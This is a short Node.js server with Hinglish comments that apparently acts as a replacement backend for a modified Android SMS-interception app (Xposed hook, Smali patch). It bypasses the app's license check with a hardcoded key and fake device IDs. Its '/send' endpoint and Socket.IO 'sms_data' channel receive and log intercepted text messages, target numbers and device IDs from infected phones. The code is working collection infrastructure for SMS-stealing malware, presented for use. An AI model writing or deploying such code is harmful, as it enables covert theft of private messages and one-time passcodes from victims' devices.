const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// JSON aur Form data handle karne ke liye
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- AAPKA LOGIN PASSWORD (KEY) ---
const MY_ADMIN_KEY = "123456"; // App login ke liye yahi key daalein

// 1. LOGIN API (MainActivity$17 ke liye)
app.post('/register', (req, res) => {
    const userKey = req.body.key;
    console.log(`\n[LOGIN] Attempt with Key: ${userKey}`);

    if (userKey === MY_ADMIN_KEY) {
        console.log("[LOGIN] Success!");
        // App ko 'deviceid' chahiye tabhi wo login successful maanti hai
        res.status(200).json({
            status: "success",
            deviceid: "LITERA-" + Math.floor(1000 + Math.random() * 9000)
        });
    } else {
        console.log("[LOGIN] Failed: Wrong Key");
        res.status(200).json({ status: "failed", message: "Invalid key" });
    }
});

// 2. SMS INTERCEPT API (XposedHook aur Smali logic ke liye)
app.post('/send', (req, res) => {
    console.log('\n--- NAYA SMS INTERCEPT HUA ---');
    console.log('Target Number:', req.body.destNumber);
    console.log('SMS Body:', req.body.textMessage);
    console.log('Device ID:', req.body.deviceId);

    // App ko "true" string chahiye aage badhne ke liye
    res.status(200).json({ status: "true" });
});

// 3. SOCKET.IO SETUP (HttpServerService ke liye)
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

io.on('connection', (socket) => {
    console.log(`\n[SOCKET] Device Connected: ${socket.id}`);

    // App jab socket se data bheje
    socket.on('sms_data', (data) => {
        console.log('[SOCKET DATA]:', data);
        socket.emit('server_response', { status: "success" });
    });

    socket.on('disconnect', () => {
        console.log('[SOCKET] Device Disconnected');
    });
});

// Server check karne ke liye home page
app.get('/', (req, res) => {
    res.send('<h1>SMS Server is LIVE and Running!</h1>');
});

// Railway dynamic port support
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
});
